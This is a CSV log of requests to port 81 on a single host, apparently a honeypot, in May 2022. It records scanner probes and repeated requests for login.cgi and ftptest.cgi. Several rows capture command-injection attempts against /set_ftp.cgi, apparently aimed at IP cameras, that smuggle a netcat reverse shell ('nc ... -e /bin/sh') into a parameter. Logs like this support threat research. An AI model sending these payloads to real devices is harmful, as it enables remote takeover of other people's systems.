ID,ADDR,VALUE,TIME
REQ_30_P81,"('128.14.209.162', 41620)","b'GET /admin/ HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-11 11:23:38.921377
REQ_31_P81,"('185.171.114.72', 57970)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-11 11:52:26.199362
REQ_32_P81,"('2.56.56.4', 41670)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-11 12:00:37.937597
REQ_33_P81,"('2.56.59.10', 56466)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-11 12:17:21.229395
REQ_34_P81,"('45.148.10.157', 37360)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 14:50:00.974836
REQ_35_P81,"('45.148.10.157', 33304)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 15:27:53.575593
REQ_36_P81,"('104.219.236.126', 49070)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 16:05:48.873153
REQ_37_P81,"('45.148.10.157', 58354)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 16:07:22.606251
REQ_38_P81,"('192.241.220.237', 36042)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-12 17:23:46.957210
REQ_39_P81,"('45.148.10.157', 53196)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 22:25:28.902970
REQ_40_P81,"('45.148.10.157', 44790)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 22:43:22.077028
REQ_41_P81,"('179.43.167.122', 40970)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-12 23:14:53.950186
REQ_42_P81,"('137.184.121.128', 44856)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 23:33:04.429067
REQ_43_P81,"('179.43.167.122', 58470)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-12 23:42:51.829995
REQ_44_P81,"('103.79.140.40', 46220)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-12 23:47:06.935904
REQ_45_P81,"('192.241.221.138', 55278)",b'MGLNDD_54.91.30.20_81\n',2022-05-13 01:50:56.846000
REQ_46_P81,"('61.58.89.44', 55478)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-13 07:42:17.073019
REQ_47_P81,"('179.43.167.122', 41978)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-13 08:34:57.296946
REQ_48_P81,"('45.148.10.157', 41252)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-13 08:55:38.941724
REQ_49_P81,"('104.219.236.126', 53664)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-13 09:12:28.419903
REQ_50_P81,"('104.248.206.55', 43096)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-13 10:09:45.289400
REQ_51_P81,"('192.241.212.220', 49450)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 10:28:35.387682
REQ_52_P81,"('179.43.167.122', 37950)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-13 10:54:03.539741
REQ_53_P81,"('108.195.13.124', 51722)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-13 10:57:28.120427
REQ_54_P81,"('137.184.121.128', 47770)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-13 11:25:17.471959
REQ_55_P81,"('104.219.236.126', 34214)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-13 11:34:17.212773
REQ_56_P81,"('179.43.167.122', 40362)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-13 11:53:20.766918
REQ_57_P81,"('164.92.87.78', 37898)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-13 23:06:58.832383
REQ_58_P81,"('198.235.24.145', 34055)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\n\r\n'",2022-05-13 23:12:43.824639
REQ_59_P81,"('103.79.140.40', 52226)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-14 00:41:08.513018
REQ_60_P81,"('104.248.206.55', 51966)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-14 00:45:51.709331
REQ_61_P81,"('104.219.236.126', 49350)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-14 01:46:48.408809
REQ_62_P81,"('147.182.135.81', 40828)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-14 16:33:56.531046
REQ_63_P81,"('103.162.30.245', 56764)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-16 14:21:30.534360
REQ_64_P81,"('179.43.167.122', 37266)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-16 14:51:17.991761
REQ_65_P81,"('37.44.238.120', 45242)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-16 15:48:32.020210
REQ_66_P81,"('37.44.238.120', 45390)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+37.44.238.120+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-16 15:48:32.524246
REQ_67_P81,"('37.44.238.120', 45442)",b'GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1\n\n',2022-05-16 15:48:33.638919
REQ_68_P81,"('179.43.167.122', 58726)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-16 16:26:52.658657
REQ_69_P81,"('2.56.56.4', 50150)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-16 16:42:51.805310
REQ_70_P81,"('192.241.216.122', 41596)",b'',2022-05-16 16:47:29.760561
REQ_71_P81,"('179.43.167.122', 56176)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-17 07:48:14.573417
REQ_72_P81,"('179.43.167.122', 59176)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-17 08:33:51.059250
REQ_73_P81,"('125.228.100.237', 35194)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-17 09:01:18.357200
REQ_74_P81,"('147.182.135.81', 33004)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-17 14:39:28.096527
REQ_75_P81,"('179.43.167.122', 53612)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-19 11:38:44.350271
REQ_76_P81,"('179.43.167.122', 58334)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-19 12:07:36.993135
REQ_77_P81,"('179.43.167.122', 45776)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-19 13:15:51.709720
REQ_78_P81,"('137.184.121.128', 33168)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-19 13:40:31.017532
REQ_79_P81,"('137.184.121.128', 59644)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-19 16:25:03.374118
REQ_80_P81,"('179.43.167.122', 41978)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-19 16:33:12.040893
REQ_81_P81,"('179.43.167.122', 34012)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-20 14:00:58.734898
REQ_82_P81,"('179.43.167.122', 56576)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-20 14:38:17.012130
REQ_83_P81,"('103.79.140.40', 56782)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-20 16:31:25.383475
REQ_84_P81,"('2.56.56.4', 37160)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-22 18:41:12.007221
REQ_85_P81,"('2.56.56.4', 45298)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-22 19:13:25.510817
REQ_86_P81,"('198.235.24.142', 60173)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\n\r\n'",2022-05-22 19:31:30.768037
REQ_87_P81,"('192.241.208.234', 56464)",b'MGLNDD_54.91.30.20_81\n',2022-05-22 19:37:56.297883
REQ_88_P81,"('103.79.140.40', 45640)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-22 22:51:29.536838
REQ_89_P81,"('220.79.195.146', 40756)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-22 22:53:33.806971
REQ_90_P81,"('103.162.30.245', 45194)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-22 23:17:44.708467
REQ_91_P81,"('107.189.30.247', 60352)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-22 23:22:00.883909
REQ_92_P81,"('107.189.30.247', 60794)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-22 23:22:01.087760
REQ_93_P81,"('107.189.30.247', 53366)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 00:05:56.836846
REQ_94_P81,"('107.189.30.247', 53786)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-23 00:05:57.025088
REQ_95_P81,"('107.189.30.247', 53866)",b'GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1\n\n',2022-05-23 00:05:58.149512
REQ_96_P81,"('103.79.140.40', 57518)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 00:48:47.447284
REQ_97_P81,"('123.194.53.150', 55134)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-23 01:15:31.622290
REQ_98_P81,"('192.241.216.126', 45240)",b'GET /manager/text/list HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-23 07:06:48.303110
REQ_99_P81,"('23.224.186.203', 54720)",b'\x16\x03\x01\x00\xae\x01\x00\x00\xaa\x03\x03~\xbb\x16\x9eH\xbe\x7f\x02\xcc\x0fw\xea\x94\x99\xa0\xaez\n\xa6\xdd\x95\xcf\xe2J\x83\xf3\xcexZ\xe3rr\x00\x00\x1a\xc0/\xc0+\xc0\x11\xc0\x07\xc0\x13\xc0\t\xc0\x14\xc0\n\x00\x05\x00/\x005\xc0\x12\x00\n\x01\x00\x00g3t\x00\x00\x00\x00\x00\x10\x00\x0e\x00\x00\x0b54.91.30.20\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x10\x00\x0e\x04\x01\x04\x03\x02\x01\x02\x03\x04\x01\x05\x01\x06\x01\xff\x01\x00\x01\x00\x00\x10\x00\x17\x00\x15\x02h2\x08http/1.1\x08spdy/3.1',2022-05-23 07:13:10.738382
REQ_100_P81,"('23.224.186.203', 54758)",b'',2022-05-23 07:13:20.877368
REQ_101_P81,"('23.224.186.203', 58236)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nCookie: rememberMe=1\r\n\r\n',2022-05-23 07:13:22.024993
REQ_102_P81,"('23.224.186.203', 59032)",b'\x80\x00\x00(r\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-23 07:13:23.261182
REQ_103_P81,"('23.224.186.203', 59480)",b'\r\n\r\n',2022-05-23 07:13:24.485591
REQ_104_P81,"('23.224.186.203', 59882)","b'-i\xbe\x06\xc8\x97\xf7\xdcy3\xb6\xcd`\xd4\xf2""\xb1q%\xd8\xddbZ\xb8\x85\xcb\xaac\x9bf\xdca\x83\x9eR\xfa\x01E\xc4\xaa\x12ntJo\xbc""\xf7\xb6\x17\xb30\xe5~\x88\xae1Y\xd0v\xd5\xdd\x98w\xc0\xad\x95\xd1\x92\xe5#\x99\xe5\xe9\xee\xd8\xcb\xba\x19\xb6\xe6w\xd8\x9f\xe0S\xa5\x15\xd4A\xce\xf4'",2022-05-23 07:13:25.726907
REQ_105_P81,"('107.189.30.247', 35784)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 10:32:46.198926
REQ_106_P81,"('107.189.30.247', 36250)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-23 10:32:46.384917
REQ_107_P81,"('179.43.167.122', 39292)",b'GET /ftptest.cgi HTTP/1.0\r\n\r\n',2022-05-23 13:14:18.505858
REQ_108_P81,"('137.184.121.128', 45694)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 13:42:15.272655
REQ_109_P81,"('137.184.71.144', 33990)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 14:48:05.502713
REQ_110_P81,"('114.34.60.126', 44204)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-23 15:18:34.687480
REQ_111_P81,"('103.79.140.40', 43898)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 17:14:29.874582
REQ_112_P81,"('2.56.56.4', 55972)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 17:21:35.838948
REQ_113_P81,"('107.189.30.247', 47420)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 17:54:08.199451
REQ_114_P81,"('107.189.30.247', 47960)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-23 17:54:08.384339
REQ_115_P81,"('164.92.87.78', 46726)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 21:14:31.654924
REQ_116_P81,"('84.203.149.135', 35250)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-23 21:47:06.238671
REQ_117_P81,"('147.182.135.81', 40196)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 21:56:32.888644
REQ_118_P81,"('107.189.30.247', 38806)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-23 22:46:15.688709
REQ_119_P81,"('107.189.30.247', 39280)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-23 22:46:15.875016
REQ_120_P81,"('107.189.30.247', 59018)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-24 08:31:08.514574
REQ_121_P81,"('107.189.30.247', 59410)",b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\n\n',2022-05-24 08:31:08.700215
REQ_122_P81,"('107.189.30.247', 59546)",b'GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1\n\n',2022-05-24 08:31:09.833727
REQ_123_P81,"('137.184.121.128', 48308)",b'GET login.cgi HTTP/1.1\r\n\r\n',2022-05-24 15:34:39.489154
REQ_124_P81,"('95.250.92.186', 42484)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-24 16:02:12.159861
